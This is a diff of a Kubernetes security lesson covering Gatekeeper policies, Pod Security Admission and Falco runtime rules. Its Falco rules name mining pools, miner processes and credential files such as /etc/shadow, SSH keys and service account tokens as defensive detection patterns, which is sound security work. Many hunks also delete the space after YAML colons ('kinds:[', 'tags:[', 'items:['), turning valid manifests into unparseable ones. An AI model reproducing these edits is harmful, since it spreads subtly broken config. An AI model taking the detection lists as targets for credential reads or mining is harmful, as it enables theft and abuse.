@@ -4,7 +4,7 @@
 
 ## Why This Lesson Matters at NovaMart
 
-```
+```text
 NovaMart runs 200+ microservices on EKS. That's 200+ teams making
 deployment decisions. Without guardrails:
 
@@ -24,40 +24,40 @@ This lesson covers the four layers of Kubernetes security:
   4. SUPPLY CHAIN — What's in your images and can you trust them (Signing, SBOM, Scanning)
 ```
 
-```
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
-│                KUBERNETES SECURITY LAYERS                             │
-│                                                                      │
-│  ┌─────────────────────────────────────────────┐                    │
-│  │  LAYER 1: ADMISSION CONTROL                  │  "Can this        │
-│  │  OPA/Gatekeeper, Kyverno                     │   deploy?"        │
-│  │  → Policy-as-code gate at API server          │                   │
-│  └──────────────────────┬──────────────────────┘                    │
-│                         │ ALLOWED                                    │
-│                         ▼                                            │
-│  ┌─────────────────────────────────────────────┐                    │
-│  │  LAYER 2: POD SECURITY                       │  "What can        │
-│  │  Pod Security Standards (PSA/PSS)             │   this pod do?"   │
-│  │  → Kernel-level restrictions on pod behavior  │                   │
-│  └──────────────────────┬──────────────────────┘                    │
-│                         │ RUNNING                                    │
-│                         ▼                                            │
-│  ┌─────────────────────────────────────────────┐                    │
-│  │  LAYER 3: RUNTIME SECURITY                   │  "What IS this    │
-│  │  Falco, eBPF-based tools                      │   pod doing?"     │
-│  │  → Real-time syscall monitoring + alerting    │                   │
-│  └──────────────────────┬──────────────────────┘                    │
-│                         │                                            │
-│                         ▼                                            │
-│  ┌─────────────────────────────────────────────┐                    │
-│  │  LAYER 4: SUPPLY CHAIN                       │  "Can I trust     │
-│  │  Image scanning, signing, SBOM, provenance    │   this image?"    │
-│  │  → Verify before Layer 1 even evaluates       │                   │
-│  └─────────────────────────────────────────────┘                    │
-│                                                                      │
-│  Defense in depth: Each layer catches what the previous missed.      │
-│  Layer 1 blocks bad configs. Layer 2 enforces kernel restrictions.   │
-│  Layer 3 detects runtime anomalies. Layer 4 validates the source.    │
+│                     KUBERNETES SECURITY LAYERS                      │
+│                                                                     │
+│ ┌──────────────────────────────────────────────┐                    │
+│ │ LAYER 1: ADMISSION CONTROL                   │  "Can this         │
+│ │ OPA/Gatekeeper, Kyverno                      │   deploy?"         │
+│ │ → Policy-as-code gate at API server          │                    │
+│ └──────────────────────┬───────────────────────┘                    │
+│                        │ ALLOWED                                    │
+│                        ▼                                            │
+│ ┌──────────────────────────────────────────────┐                    │
+│ │ LAYER 2: POD SECURITY                        │  "What can         │
+│ │ Pod Security Standards (PSA/PSS)             │   this pod do?"    │
+│ │ → Kernel-level restrictions on pod behavior  │                    │
+│ └──────────────────────┬───────────────────────┘                    │
+│                        │ RUNNING                                    │
+│                        ▼                                            │
+│ ┌──────────────────────────────────────────────┐                    │
+│ │ LAYER 3: RUNTIME SECURITY                    │  "What IS this     │
+│ │ Falco, eBPF-based tools                      │   pod doing?"      │
+│ │ → Real-time syscall monitoring + alerting    │                    │
+│ └──────────────────────┬───────────────────────┘                    │
+│                        │                                            │
+│                        ▼                                            │
+│ ┌──────────────────────────────────────────────┐                    │
+│ │ LAYER 4: SUPPLY CHAIN                        │  "Can I trust      │
+│ │ Image scanning, signing, SBOM, provenance    │   this image?"     │
+│ │ → Verify before Layer 1 even evaluates       │                    │
+│ └──────────────────────────────────────────────┘                    │
+│                                                                     │
+│ Defense in depth: Each layer catches what the previous missed.      │
+│ Layer 1 blocks bad configs. Layer 2 enforces kernel restrictions.   │
+│ Layer 3 detects runtime anomalies. Layer 4 validates the source.    │
 └─────────────────────────────────────────────────────────────────────┘
 ```
 
@@ -67,46 +67,46 @@ This lesson covers the four layers of Kubernetes security:
 
 ### What Is Admission Control?
 
-```
+```text
 Every API request to Kubernetes passes through an ADMISSION CHAIN:
 
   kubectl apply -f deployment.yaml
        │
        ▼
   ┌──────────────────┐
-  │ AUTHENTICATION    │  "WHO are you?" (x509, OIDC, ServiceAccount token)
+  │ AUTHENTICATION   │  "WHO are you?" (x509, OIDC, ServiceAccount token)
   └────────┬─────────┘
            ▼
   ┌──────────────────┐
-  │ AUTHORIZATION     │  "CAN you do this?" (RBAC: Role/ClusterRoleBinding)
+  │ AUTHORIZATION    │  "CAN you do this?" (RBAC: Role/ClusterRoleBinding)
   └────────┬─────────┘
            ▼
   ┌──────────────────────────────────────────────────────────────┐
-  │ MUTATING ADMISSION WEBHOOKS                                   │
-  │  → Modify the request (inject sidecars, add labels, set      │
-  │    defaults). Runs FIRST because validators validate the      │
-  │    MUTATED result.                                            │
-  │                                                               │
-  │  Examples:                                                    │
-  │    Istio sidecar injector: adds Envoy container               │
-  │    Vault Agent injector: adds vault-agent-init + sidecar      │
-  │    OPA Gatekeeper: can mutate (add labels, set defaults)      │
-  │    Kyverno: generate resources, set defaults                  │
+  │ MUTATING ADMISSION WEBHOOKS                                  │
+  │ → Modify the request (inject sidecars, add labels, set       │
+  │   defaults). Runs FIRST because validators validate the      │
+  │   MUTATED result.                                            │
+  │                                                              │
+  │ Examples:                                                    │
+  │   Istio sidecar injector: adds Envoy container               │
+  │   Vault Agent injector: adds vault-agent-init + sidecar      │
+  │   OPA Gatekeeper: can mutate (add labels, set defaults)      │
+  │   Kyverno: generate resources, set defaults                  │
   └────────┬─────────────────────────────────────────────────────┘
            ▼
   ┌──────────────────────────────────────────────────────────────┐
-  │ VALIDATING ADMISSION WEBHOOKS                                 │
-  │  → Accept or reject the request. Cannot modify it.            │
-  │  → THIS is where policy enforcement happens.                  │
-  │                                                               │
-  │  Examples:                                                    │
-  │    OPA Gatekeeper: reject pods without resource limits        │
-  │    Kyverno: reject images not from approved registries        │
-  │    Pod Security Admission: enforce PSS levels                 │
+  │ VALIDATING ADMISSION WEBHOOKS                                │
+  │ → Accept or reject the request. Cannot modify it.            │
+  │ → THIS is where policy enforcement happens.                  │
+  │                                                              │
+  │ Examples:                                                    │
+  │   OPA Gatekeeper: reject pods without resource limits        │
+  │   Kyverno: reject images not from approved registries        │
+  │   Pod Security Admission: enforce PSS levels                 │
   └────────┬─────────────────────────────────────────────────────┘
            ▼
   ┌──────────────────┐
-  │ PERSIST TO ETCD   │  Object created/updated
+  │ PERSIST TO ETCD  │  Object created/updated
   └──────────────────┘
 
 KEY INSIGHT: Admission webhooks are the ONLY point where you can
@@ -116,7 +116,7 @@ etcd, you need runtime detection (Falco) to catch violations.
 
 ### OPA — Open Policy Agent
 
-```
+```text
 OPA is a GENERAL-PURPOSE policy engine. It's not Kubernetes-specific.
 
   OPA = Decision engine
@@ -138,7 +138,7 @@ NovaMart uses OPA in TWO places:
 
 ### Gatekeeper — OPA for Kubernetes
 
-```
+```text
 Gatekeeper is the Kubernetes-native integration of OPA.
 
   Instead of writing raw Rego and managing OPA sidecars,
@@ -152,34 +152,34 @@ Gatekeeper is the Kubernetes-native integration of OPA.
 ARCHITECTURE:
 
   ┌──────────────────────────────────────────────────────────┐
-  │                    EKS CLUSTER                            │
-  │                                                           │
-  │  ┌─────────────┐     ┌─────────────────────────────────┐ │
-  │  │  API Server  │────→│  Gatekeeper Webhook             │ │
-  │  │              │     │  (ValidatingAdmissionWebhook)   │ │
-  │  │              │     │                                  │ │
-  │  │              │     │  ┌──────────────────────────┐   │ │
-  │  │              │     │  │ OPA Engine               │   │ │
-  │  │              │     │  │                          │   │ │
-  │  │              │     │  │ ConstraintTemplates      │   │ │
-  │  │              │     │  │ (Rego policies)          │   │ │
-  │  │              │     │  │         +                │   │ │
-  │  │              │     │  │ Constraints              │   │ │
-  │  │              │     │  │ (policy parameters +     │   │ │
-  │  │              │     │  │  scope/match rules)      │   │ │
-  │  │              │     │  └──────────────────────────┘   │ │
-  │  │              │     │                                  │ │
-  │  │              │     │  Audit Controller               │ │
-  │  │              │     │  (periodically scans existing   │ │
-  │  │              │     │   resources for violations)     │ │
-  │  └─────────────┘     └─────────────────────────────────┘ │
-  │                                                           │
-  │  ConstraintTemplate → defines the POLICY (Rego code)      │
-  │  Constraint → defines WHERE and HOW the policy applies    │
-  │                                                           │
-  │  Think of it like:                                        │
-  │    ConstraintTemplate = the function definition            │
-  │    Constraint = the function call with arguments           │
+  │                       EKS CLUSTER                        │
+  │                                                          │
+  │ ┌────────────┐     ┌───────────────────────────────────┐ │
+  │ │ API Server │────→│ Gatekeeper Webhook                │ │
+  │ │            │     │ (ValidatingAdmissionWebhook)      │ │
+  │ │            │     │                                   │ │
+  │ │            │     │ ┌───────────────────────────────┐ │ │
+  │ │            │     │ │ OPA Engine                    │ │ │
+  │ │            │     │ │                               │ │ │
+  │ │            │     │ │ ConstraintTemplates           │ │ │
+  │ │            │     │ │ (Rego policies)               │ │ │
+  │ │            │     │ │         +                     │ │ │
+  │ │            │     │ │ Constraints                   │ │ │
+  │ │            │     │ │ (policy parameters +          │ │ │
+  │ │            │     │ │  scope/match rules)           │ │ │
+  │ │            │     │ └───────────────────────────────┘ │ │
+  │ │            │     │                                   │ │
+  │ │            │     │ Audit Controller                  │ │
+  │ │            │     │ (periodically scans existing      │ │
+  │ │            │     │  resources for violations)        │ │
+  │ └────────────┘     └───────────────────────────────────┘ │
+  │                                                          │
+  │ ConstraintTemplate → defines the POLICY (Rego code)      │
+  │ Constraint → defines WHERE and HOW the policy applies    │
+  │                                                          │
+  │ Think of it like:                                        │
+  │   ConstraintTemplate = the function definition           │
+  │   Constraint = the function call with arguments          │
   └──────────────────────────────────────────────────────────┘
 ```
 
@@ -221,7 +221,7 @@ helm install gatekeeper gatekeeper/gatekeeper \
 
 ### Gatekeeper Policy Model: ConstraintTemplate + Constraint
 
-```
+```text
 THE TWO-LAYER MODEL:
 
   ConstraintTemplate:
@@ -289,8 +289,7 @@ spec:
           container := input_containers[_]
           not image_allowed(container.image)
           msg := sprintf(
-            "Container '%v' image '%v' is not from an approved registry. Approved: %v",
-            [container.name, container.image, input.parameters.registries]
+            "Container '%v' image '%v' is not from an approved registry. Approved: %v",[container.name, container.image, input.parameters.registries]
           )
         }
 
@@ -330,14 +329,14 @@ spec:
       - apiGroups: [""]
         kinds: ["Pod"]
       - apiGroups: ["apps"]
-        kinds: ["Deployment", "StatefulSet", "DaemonSet"]
+        kinds:["Deployment", "StatefulSet", "DaemonSet"]
       - apiGroups: ["batch"]
         kinds: ["Job", "CronJob"]
     namespaceSelector:
       matchExpressions:
         - key: environment
           operator: In
-          values: ["production", "staging"]
+          values:["production", "staging"]
     excludedNamespaces:
       - kube-system
       - gatekeeper-system
@@ -356,7 +355,7 @@ spec:
       - "docker.io/istio/proxyv2:1.20.0"  # Pinned Istio version
 ```
 
-```
+```text
 REGO EXPLAINED (for those who haven't written it):
 
   violation[{"msg": msg}] { ... }
@@ -439,8 +438,7 @@ spec:
           container := input_containers[_]
           not container.resources.limits.memory
           msg := sprintf(
-            "Container '%v' must have memory limits set",
-            [container.name]
+            "Container '%v' must have memory limits set",[container.name]
           )
         }
 
@@ -453,8 +451,7 @@ spec:
           max_bytes := to_bytes(input.parameters.maxMemoryLimit)
           mem_limit_bytes > max_bytes
           msg := sprintf(
-            "Container '%v' memory limit %v exceeds maximum %v",
-            [container.name, mem_limit, input.parameters.maxMemoryLimit]
+            "Container '%v' memory limit %v exceeds maximum %v",[container.name, mem_limit, input.parameters.maxMemoryLimit]
           )
         }
 
@@ -505,7 +502,7 @@ spec:
                              # (use requests only — avoid CFS throttling)
 ```
 
-```
+```text
 NOTE ON CPU LIMITS:
 NovaMart does NOT enforce CPU limits. Why?
 
@@ -664,8 +661,7 @@ spec:
           label_value := input.review.object.metadata.labels[required.key]
           not re_match(required.allowedRegex, label_value)
           msg := sprintf(
-            "Label '%v' value '%v' does not match regex '%v'",
-            [required.key, label_value, required.allowedRegex]
+            "Label '%v' value '%v' does not match regex '%v'",[required.key, label_value, required.allowedRegex]
           )
         }
 
@@ -688,7 +684,7 @@ spec:
       matchExpressions:
         - key: environment
           operator: In
-          values: ["production", "staging"]
+          values:["production", "staging"]
   parameters:
     labels:
       - key: "app.kubernetes.io/name"
@@ -734,8 +730,7 @@ spec:
           disallowed := input.parameters.tags[_]
           tag == disallowed
           msg := sprintf(
-            "Container '%v' uses disallowed tag '%v'. Use a specific immutable tag.",
-            [container.name, tag]
+            "Container '%v' uses disallowed tag '%v'. Use a specific immutable tag.",[container.name, tag]
           )
         }
 
@@ -781,7 +776,7 @@ spec:
   match:
     kinds:
       - apiGroups: [""]
-        kinds: ["Pod"]
+        kinds:["Pod"]
     namespaceSelector:
       matchExpressions:
         - key: environment
@@ -863,61 +858,61 @@ spec:
 
 ### Gatekeeper Enforcement Strategy — The Rollout
 
-```
+```text
 NEVER go straight to "deny" in production. Here's the correct rollout:
 
 PHASE 1: AUDIT ONLY (Week 1-2)
-  ┌─────────────────────────────────────────────────────────────┐
-  │ enforcementAction: dryrun                                    │
-  │                                                              │
-  │ What happens:                                                │
-  │   - Gatekeeper evaluates all resources against policies      │
-  │   - Violations are LOGGED and stored on the Constraint       │
-  │   - Nothing is blocked                                       │
-  │   - Audit controller finds existing violations               │
-  │                                                              │
-  │ Why:                                                         │
-  │   - See how many existing resources violate the policy       │
-  │   - Identify legitimate exceptions that need allowlisting    │
-  │   - Build developer confidence that policies won't break     │
-  │     their workflows                                          │
-  └─────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────┐
+│ enforcementAction: dryrun                                   │
+│                                                             │
+│ What happens:                                               │
+│   - Gatekeeper evaluates all resources against policies     │
+│   - Violations are LOGGED and stored on the Constraint      │
+│   - Nothing is blocked                                      │
+│   - Audit controller finds existing violations              │
+│                                                             │
+│ Why:                                                        │
+│   - See how many existing resources violate the policy      │
+│   - Identify legitimate exceptions that need allowlisting   │
+│   - Build developer confidence that policies won't break    │
+│     their workflows                                         │
+└─────────────────────────────────────────────────────────────┘
 
-  # Check violations:
-  kubectl get K8sAllowedRegistries allowed-registries-production \
-    -o jsonpath='{.status.violations}' | jq .
+# Check violations:
+kubectl get K8sAllowedRegistries allowed-registries-production \
+  -o jsonpath='{.status.violations}' | jq .
 
-  # Count total violations:
-  kubectl get K8sAllowedRegistries allowed-registries-production \
-    -o jsonpath='{.status.totalViolations}'
+# Count total violations:
+kubectl get K8sAllowedRegistries allowed-registries-production \
+  -o jsonpath='{.status.totalViolations}'
 
 PHASE 2: WARN (Week 3-4)
-  ┌─────────────────────────────────────────────────────────────┐
-  │ enforcementAction: warn                                      │
-  │                                                              │
-  │ What happens:                                                │
-  │   - API request SUCCEEDS but kubectl shows a WARNING         │
-  │   - Developers see the message but aren't blocked            │
-  │   - Dashboard shows violation metrics rising or falling      │
-  │                                                              │
-  │ Why:                                                         │
-  │   - Developers fix violations before enforcement             │
-  │   - Builds awareness without disruption                      │
-  └─────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────┐
+│ enforcementAction: warn                                     │
+│                                                             │
+│ What happens:                                               │
+│   - API request SUCCEEDS but kubectl shows a WARNING        │
+│   - Developers see the message but aren't blocked           │
+│   - Dashboard shows violation metrics rising or falling     │
+│                                                             │
+│ Why:                                                        │
+│   - Developers fix violations before enforcement            │
+│   - Builds awareness without disruption                     │
+└─────────────────────────────────────────────────────────────┘
 
 PHASE 3: DENY (Week 5+)
-  ┌─────────────────────────────────────────────────────────────┐
-  │ enforcementAction: deny                                      │
-  │                                                              │
-  │ What happens:                                                │
-  │   - API request REJECTED with error message                  │
-  │   - Resource is NOT created/updated                          │
-  │   - Error includes the violation message from Rego           │
-  │                                                              │
-  │ Why:                                                         │
-  │   - Hard enforcement — no exceptions unless explicitly       │
-  │     configured in the Constraint                             │
-  └─────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────┐
+│ enforcementAction: deny                                     │
+│                                                             │
+│ What happens:                                               │
+│   - API request REJECTED with error message                 │
+│   - Resource is NOT created/updated                         │
+│   - Error includes the violation message from Rego          │
+│                                                             │
+│ Why:                                                        │
+│   - Hard enforcement — no exceptions unless explicitly      │
+│     configured in the Constraint                            │
+└─────────────────────────────────────────────────────────────┘
 
 IMPORTANT: Keep some policies PERMANENTLY in warn or dryrun
 for new/experimental namespaces. Not everything needs deny.
@@ -925,7 +920,7 @@ for new/experimental namespaces. Not everything needs deny.
 
 ### Gatekeeper vs Kyverno — The Comparison
 
-```
+```text
 ┌───────────────────┬──────────────────────┬──────────────────────┐
 │ Feature           │ Gatekeeper (OPA)     │ Kyverno              │
 ├───────────────────┼──────────────────────┼──────────────────────┤
@@ -933,7 +928,7 @@ for new/experimental namespaces. Not everything needs deny.
 │ Learning curve    │ HIGH (Rego is hard)  │ LOW (just YAML)      │
 │ Flexibility       │ Extremely flexible   │ Covers 90% of cases  │
 │ Mutation          │ Yes (newer feature)  │ Yes (first-class)    │
-│ Generation        │ No                   │ Yes (create resources │
+│ Generation        │ No                   │ Yes (create resources│
 │                   │                      │  when pod created)   │
 │ Validation        │ Yes                  │ Yes                  │
 │ Image verification│ External (Cosign)    │ Built-in (Cosign,    │
@@ -968,7 +963,7 @@ WHY NOVAMART ALSO USES KYVERNO (for one thing):
 
 ### Gatekeeper Failure Modes
 
-```
+```text
 FAILURE 1: Gatekeeper webhook down → ALL deployments blocked
   CAUSE: Gatekeeper pods crashloop, OOM, or scheduling failure
   SYMPTOM: kubectl apply returns "connection refused" or "timeout"
@@ -1117,7 +1112,7 @@ spec:
 
 ### The Evolution
 
-```
+```text
 PSP (PodSecurityPolicy) → DEPRECATED in K8s 1.21, REMOVED in 1.25
   Why removed: Complex, confusing, hard to debug, mutating behavior unexpected
 
@@ -1137,48 +1132,48 @@ THE KEY DIFFERENCE FROM GATEKEEPER:
 
 ### The Three Pod Security Standards Levels
 
-```
-┌─────────────┬──────────────────────────────────────────────────────────┐
-│ Level       │ What It Restricts                                        │
-├─────────────┼──────────────────────────────────────────────────────────┤
-│             │                                                          │
-│ PRIVILEGED  │ Nothing. Unrestricted. Full access.                      │
-│             │ Use for: kube-system, monitoring (node-exporter),         │
-│             │          Istio CNI, storage drivers                       │
-│             │                                                          │
-├─────────────┼──────────────────────────────────────────────────────────┤
-│             │ Prevents known privilege escalation vectors:              │
-│ BASELINE    │ ❌ hostNetwork, hostPID, hostIPC                          │
-│             │ ❌ privileged containers                                   │
-│             │ ❌ Adding Linux capabilities (except: NET_BIND_SERVICE)    │
-│             │ ❌ hostPath volumes                                        │
-│             │ ❌ hostPort (by default)                                   │
-│             │ ❌ /proc mount types other than Default                    │
-│             │ ❌ Sysctls other than safe subset                          │
-│             │ ❌ WindowsHostProcess                                      │
-│             │ ✅ Allows: running as root, writable rootfs, all seccomp  │
-│             │                                                          │
-│             │ Use for: General workloads that need some flexibility     │
-│             │                                                          │
-├─────────────┼──────────────────────────────────────────────────────────┤
-│             │ Everything in Baseline PLUS:                              │
-│ RESTRICTED  │ ❌ Running as root (must set runAsNonRoot: true)           │
-│             │ ❌ Writable root filesystem (in some strict               │
-│             │    interpretations, though PSA doesn't enforce this)      │
-│             │ ❌ ALL capabilities must be dropped (drop: ["ALL"])        │
-│             │ ❌ Privilege escalation (allowPrivilegeEscalation: false)  │
-│             │ ❌ seccomp must be RuntimeDefault or Localhost              │
-│             │ Must set: runAsNonRoot: true                              │
-│             │ Must set: seccompProfile type                             │
-│             │                                                          │
-│             │ Use for: Hardened production workloads                    │
-│             │          PCI-scoped services (payment-svc, fraud-svc)    │
-└─────────────┴──────────────────────────────────────────────────────────┘
+```text
+┌────────────┬───────────────────────────────────────────────────────────┐
+│ Level      │ What It Restricts                                         │
+├────────────┼───────────────────────────────────────────────────────────┤
+│            │                                                           │
+│ PRIVILEGED │ Nothing. Unrestricted. Full access.                       │
+│            │ Use for: kube-system, monitoring (node-exporter),         │
+│            │          Istio CNI, storage drivers                       │
+│            │                                                           │
+├────────────┼───────────────────────────────────────────────────────────┤
+│            │ Prevents known privilege escalation vectors:              │
+│ BASELINE   │ ❌ hostNetwork, hostPID, hostIPC                          │
+│            │ ❌ privileged containers                                  │
+│            │ ❌ Adding Linux capabilities (except: NET_BIND_SERVICE)   │
+│            │ ❌ hostPath volumes                                       │
+│            │ ❌ hostPort (by default)                                  │
+│            │ ❌ /proc mount types other than Default                   │
+│            │ ❌ Sysctls other than safe subset                         │
+│            │ ❌ WindowsHostProcess                                     │
+│            │ ✅ Allows: running as root, writable rootfs, all seccomp  │
+│            │                                                           │
+│            │ Use for: General workloads that need some flexibility     │
+│            │                                                           │
+├────────────┼───────────────────────────────────────────────────────────┤
+│            │ Everything in Baseline PLUS:                              │
+│ RESTRICTED │ ❌ Running as root (must set runAsNonRoot: true)          │
+│            │ ❌ Writable root filesystem (in some strict               │
+│            │    interpretations, though PSA doesn't enforce this)      │
+│            │ ❌ ALL capabilities must be dropped (drop: ["ALL"])       │
+│            │ ❌ Privilege escalation (allowPrivilegeEscalation: false) │
+│            │ ❌ seccomp must be RuntimeDefault or Localhost            │
+│            │ Must set: runAsNonRoot: true                              │
+│            │ Must set: seccompProfile type                             │
+│            │                                                           │
+│            │ Use for: Hardened production workloads                    │
+│            │          PCI-scoped services (payment-svc, fraud-svc)     │
+└────────────┴───────────────────────────────────────────────────────────┘
 ```
 
 ### Pod Security Admission Modes
 
-```
+```text
 PSA is applied PER NAMESPACE via labels.
 Three MODES control what happens when a pod violates the level:
 
@@ -1293,7 +1288,7 @@ spec:
       emptyDir: {}  # Because rootfs is read-only, app needs writable /tmp
 ```
 
-```
+```text
 COMMON PSA VIOLATIONS AND FIXES:
 
   "runAsNonRoot must be true"
@@ -1321,7 +1316,7 @@ COMMON PSA VIOLATIONS AND FIXES:
 
 ### PSA + Gatekeeper = Defense in Depth
 
-```
+```text
 NovaMart uses BOTH:
 
   PSA (built-in):
@@ -1349,7 +1344,7 @@ NovaMart uses BOTH:
 
 ### Why Runtime Security Exists
 
-```
+```text
 ADMISSION CONTROL (Gatekeeper, PSA) prevents BAD CONFIGURATIONS
 from entering the cluster. But what about:
 
@@ -1368,53 +1363,52 @@ Falco fills this gap.
 
 ### Falco Architecture
 
-```
+```text
 ┌─────────────────────────────────────────────────────────────────────┐
-│                    FALCO ARCHITECTURE                                 │
-│                                                                      │
-│  ┌──────────────────────────────────────────────┐                   │
-│  │              Linux Kernel                      │                   │
-│  │  ┌────────────────────────────────────────┐   │                   │
-│  │  │         Syscall Interface               │   │                   │
-│  │  │  open(), exec(), connect(), read()...   │   │                   │
-│  │  └───────────────┬────────────────────────┘   │                   │
-│  │                  │                             │                   │
-│  │  ┌───────────────▼────────────────────────┐   │                   │
-│  │  │  eBPF probe (or kernel module)          │   │                   │
-│  │  │  Captures syscalls with ZERO overhead   │   │                   │
-│  │  │  on non-matching events                 │   │                   │
-│  │  └───────────────┬────────────────────────┘   │                   │
-│  └──────────────────┼────────────────────────────┘                   │
-│                     │ Syscall events (raw)                           │
-│                     ▼                                                │
-│  ┌──────────────────────────────────────────────┐                   │
-│  │            Falco Engine (userspace)            │                   │
-│  │                                               │                   │
-│  │  ┌────────────────────┐                       │                   │
-│  │  │  Rules Engine       │  YAML rules that      │                   │
-│  │  │  (condition →       │  match syscall         │                   │
-│  │  │   output → priority)│  patterns              │                   │
-│  │  └────────┬───────────┘                       │                   │
-│  │           │ Match!                            │                   │
-│  │           ▼                                   │                   │
-│  │  ┌────────────────────┐                       │                   │
-│  │  │  Output Engine      │                       │                   │
-│  │  │  stdout, file,      │                       │                   │
-│  │  │  syslog, gRPC,      │                       │                   │
-│  │  │  HTTP webhook        │                       │                   │
-│  │  └────────┬───────────┘                       │                   │
-│  └───────────┼───────────────────────────────────┘                   │
-│              │                                                       │
-│              ▼                                                       │
-│  ┌──────────────────────────────────────────────┐                   │
-│  │  Alert Pipeline                                │                   │
-│  │                                               │                   │
-│  │  Falco → Falcosidekick → PagerDuty            │                   │
-│  │                        → Slack                 │                   │
-│  │                        → Loki (log storage)    │                   │
-│  │                        → OPA (auto-response)   │                   │
-│  │                        → K8s (kill pod)         │                   │
-│  └──────────────────────────────────────────────┘                   │
+│                         FALCO ARCHITECTURE                          │
+│                                                                     │
+│ ┌─────────────────────────────────────────────────────────────────┐ │
+│ │ Linux Kernel                                                    │ │
+│ │ ┌─────────────────────────────────────────────────────────────┐ │ │
+│ │ │ Syscall Interface                                           │ │ │
+│ │ │ open(), exec(), connect(), read()...                        │ │ │
+│ │ └──────────────────────────────┬──────────────────────────────┘ │ │
+│ │                                │                                │ │
+│ │ ┌──────────────────────────────▼──────────────────────────────┐ │ │
+│ │ │ eBPF probe (or kernel module)                               │ │ │
+│ │ │ Captures syscalls with ZERO overhead on non-matching events │ │ │
+│ │ └──────────────────────────────┬──────────────────────────────┘ │ │
+│ └────────────────────────────────┼────────────────────────────────┘ │
+│                                  │ Syscall events (raw)             │
+│                                  ▼                                  │
+│ ┌─────────────────────────────────────────────────────────────────┐ │
+│ │ Falco Engine (userspace)                                        │ │
+│ │                                                                 │ │
+│ │ ┌────────────────────────┐                                      │ │
+│ │ │ Rules Engine           │  YAML rules that                     │ │
+│ │ │ (condition →           │  match syscall                       │ │
+│ │ │  output → priority)    │  patterns                            │ │
+│ │ └───────────┬────────────┘                                      │ │
+│ │             │ Match!                                            │ │
+│ │             ▼                                                   │ │
+│ │ ┌────────────────────────┐                                      │ │
+│ │ │ Output Engine          │                                      │ │
+│ │ │ stdout, file,          │                                      │ │
+│ │ │ syslog, gRPC,          │                                      │ │
+│ │ │ HTTP webhook           │                                      │ │
+│ │ └───────────┬────────────┘                                      │ │
+│ └─────────────┼───────────────────────────────────────────────────┘ │
+│               │                                                     │
+│               ▼                                                     │
+│ ┌─────────────────────────────────────────────────────────────────┐ │
+│ │ Alert Pipeline                                                  │ │
+│ │                                                                 │ │
+│ │ Falco → Falcosidekick → PagerDuty                               │ │
+│ │                       → Slack                                   │ │
+│ │                       → Loki (log storage)                      │ │
+│ │                       → OPA (auto-response)                     │ │
+│ │                       → K8s (kill pod)                          │ │
+│ └─────────────────────────────────────────────────────────────────┘ │
 └─────────────────────────────────────────────────────────────────────┘
 
 KEY POINTS:
@@ -1485,7 +1479,7 @@ helm install falco falcosecurity/falco \
      cmdline=%proc.cmdline
      image=%container.image.repository)
   priority: WARNING
-  tags: [container, shell, mitre_execution]
+  tags:[container, shell, mitre_execution]
   
 # Breaking it down:
 #   condition: Boolean expression using Falco filter fields
@@ -1514,7 +1508,7 @@ customRules:
     # RULE 1: Cryptocurrency mining detection
     # ============================================================
     - list: mining_pools
-      items: [
+      items:[
         "pool.minergate.com", "xmr.pool.minergate.com",
         "pool.hashvault.pro", "xmrpool.eu",
         "monerohash.com", "minexmr.com",
@@ -1522,7 +1516,7 @@ customRules:
       ]
 
     - list: mining_processes
-      items: [
+      items:[
         xmrig, ccminer, cgminer, bfgminer, cpuminer,
         minerd, minergate, stratum
       ]
@@ -1550,7 +1544,7 @@ customRules:
     # RULE 2: Sensitive file access in container
     # ============================================================
     - list: sensitive_file_paths
-      items: [
+      items:[
         /etc/shadow, /etc/passwd, /etc/sudoers,
         /root/.ssh, /root/.bash_history,
         /var/run/secrets/kubernetes.io/serviceaccount/token,
@@ -1591,7 +1585,7 @@ customRules:
          container=%container.name pod=%k8s.pod.name
          ns=%k8s.ns.name image=%container.image.repository)
       priority: CRITICAL
-      tags: [drift, mitre_execution, mitre_persistence]
+      tags:[drift, mitre_execution, mitre_persistence]
       # proc.is_exe_writable=true means the executable file was
       # modified AFTER the container started. It was NOT in the
       # original image. Something wrote it at runtime.
@@ -1615,13 +1609,13 @@ customRules:
          container=%container.name pod=%k8s.pod.name
          ns=%k8s.ns.name image=%container.image.repository)
       priority: CRITICAL
-      tags: [network, shell, mitre_command_and_control]
+      tags:[network, shell, mitre_command_and_control]
 
     # ============================================================
     # RULE 5: Kubernetes API access from unexpected container
     # ============================================================
     - list: k8s_api_allowed_containers
-      items: [
+      items:[
         "vault-agent", "external-secrets",
         "argocd-application-controller",
         "cert-manager", "kyverno",
@@ -1645,7 +1639,7 @@ customRules:
          cmdline=%proc.cmdline
          image=%container.image.repository)
       priority: ERROR
-      tags: [k8s_api, mitre_discovery, mitre_lateral_movement]
+      tags:[k8s_api, mitre_discovery, mitre_lateral_movement]
 
     # ============================================================
     # RULE 6: Outbound connection to non-approved CIDR
@@ -1703,23 +1697,23 @@ customRules:
 
 ### Falco + Falcosidekick — Automated Response
 
-```
+```text
 Falcosidekick isn't just an alert router. It can trigger AUTOMATED RESPONSES:
 
   ┌────────────────────────────────────────────────────────────┐
-  │  Falco Alert (CRITICAL)                                     │
-  │  "Cryptocurrency mining detected in orders namespace"       │
+  │  Falco Alert (CRITICAL)                                    │
+  │  "Cryptocurrency mining detected in orders namespace"      │
   └────────────────┬───────────────────────────────────────────┘
                    │
                    ▼
   ┌────────────────────────────────────────────────────────────┐
-  │  Falcosidekick                                              │
-  │                                                             │
-  │  Route 1: → Slack #security-alerts (all priorities)         │
+  │  Falcosidekick                                             │
+  │                                                            │
+  │  Route 1: → Slack #security-alerts (all priorities)        │
   │  Route 2: → PagerDuty (CRITICAL only → page on-call)       │
   │  Route 3: → Loki (all events → long-term storage + query)  │
-  │  Route 4: → Kubernetes Response Engine                      │
-  │            (auto-kill pod, auto-taint node, auto-label)     │
+  │  Route 4: → Kubernetes Response Engine                     │
+  │            (auto-kill pod, auto-taint node, auto-label)    │
   └────────────────────────────────────────────────────────────┘
 ```
 
@@ -1762,7 +1756,7 @@ falcosidekick:
 #   - action: kubernetes:networkpolicy
 #     parameters:
 #       # Apply a deny-all NetworkPolicy to isolate the pod
-#       allow: []
+#       allow:[]
 #     match:
 #       rules:
 #         - "Unexpected outbound connection from PCI namespace"
@@ -1777,7 +1771,7 @@ falcosidekick:
 
 ### Falco Failure Modes
 
-```
+```text
 FAILURE 1: eBPF probe fails to load on EKS node
   CAUSE: Kernel version incompatible, BTF not available,
